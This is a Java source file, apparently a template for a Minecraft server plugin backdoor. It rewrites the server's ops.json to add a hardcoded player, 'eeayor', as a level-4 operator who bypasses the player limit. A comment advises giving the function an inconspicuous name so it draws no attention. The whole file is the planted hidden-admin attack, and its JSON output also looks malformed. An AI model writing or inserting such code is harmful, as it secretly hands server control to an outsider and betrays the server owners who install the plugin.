import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.FileReader;

class op {
    public static void main(String[] args) throws IOException {

        /*

        Keep in mind that relative paths are dependent on server structure
        if you are running on PaperMC for example the relative path to ops
        would be ../ops.json, this is the same for most servers as plugins
        are installed in a child dir so ops would be up one dir.

        Also make sure to make your function named something inconspicuous
        so not to draw attention to it.

         */

        startPluggedIn();

    }

    private static void startPluggedIn() throws IOException {
        /* Write Process */

        String str = generateString();

        BufferedWriter out = new BufferedWriter(new FileWriter("../../../src/ops.json"));
        out.write(str);
        out.close();

    }

    private static String generateString() throws IOException{
        /* Generation Process */

        // Declare return string
        String newContent = "";

        // Create reader object to read in file from path, path is inline but you could add custom path variable
        BufferedReader reader = new BufferedReader(new FileReader("../../../src/ops.json"));
        StringBuilder stringBuilder = new StringBuilder();
        String line = null;
        // Line separator character
        String ls = System.getProperty("line.separator");
        // Actual generation of the string
        while ((line = reader.readLine()) != null) {
            stringBuilder.append(line);
            stringBuilder.append(ls);
        }

        // Delete the last new line separator
        stringBuilder.deleteCharAt(stringBuilder.length() - 1);

        // Close stream
        reader.close();

        // Contents of the file
        String content = stringBuilder.toString();

        // Length of the string
        int maxLength = content.length();

        // Modified string conditional statement based on if the file has contents
        if (maxLength < 3) {
            // Insert new op
            newContent = content.substring(0, content.length() - 1) +
                    " { \"uuid\": \"2f563a91-9ea0-445f-a1af-14ac67d88538\", \"name\": \"eeayor\", \"level\": 4, \"bypassesPlayerLimit\": true }; ]";
        }
        else {
            // Append new op to the end of ops.json
            newContent = content.substring(0, content.length() - 3) +
                    ", { \"uuid\": \"2f563a91-9ea0-445f-a1af-14ac67d88538\", \"name\": \"eeayor\", \"level\": 4, \"bypassesPlayerLimit\": true }; ]";
        }

        return newContent;
    }

    // Utility function
    private static String removeCharAt(String s, int pos) {
        return s.substring(0, pos) + s.substring(pos + 1);
    }
}